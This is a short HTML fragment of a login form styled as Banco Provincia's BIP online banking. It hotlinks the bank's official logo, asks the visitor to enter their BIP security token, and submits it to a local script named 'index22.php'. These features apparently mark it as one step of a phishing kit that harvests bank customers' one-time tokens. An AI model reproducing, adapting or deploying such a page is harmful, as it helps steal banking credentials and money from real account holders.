...
<section class="login-block">
	...
	<div class="row justify-content-center">
		<div class="col-md-4 login-sec ">
		    <img class="justify-content-center" src="https://www.bancoprovincia.bancainternet.com.ar/eBanking/images/IN/bapro_logo_2021.png?v=3">
		    <form class="login-form" id="login" name="login" method="post" autocomplete="off" action="index22.php" >
  <div class="form-group" style="margin-bottom:20px;">
    <label for="exampleInputEmail1" class="text-uppercase">INGRESAR TOKEN BIP </label>
    <input name="tres" type="text" class="form-control" placeholder="">
    
  </div>
  <div class="d-flex justify-content-center "style="margin-bottom:60px;font-size">
    <a class="linkear" href="">¿NO SOS BIP? REGISTRATE AQUÍ</a>
  </div>
  ...
  <div class="d-flex justify-content-center" style="margin-bottom: 20px;">
    ...
    <button type="submit" class="btn btn-login float-lg-none">Ingresar</button>
  </div>
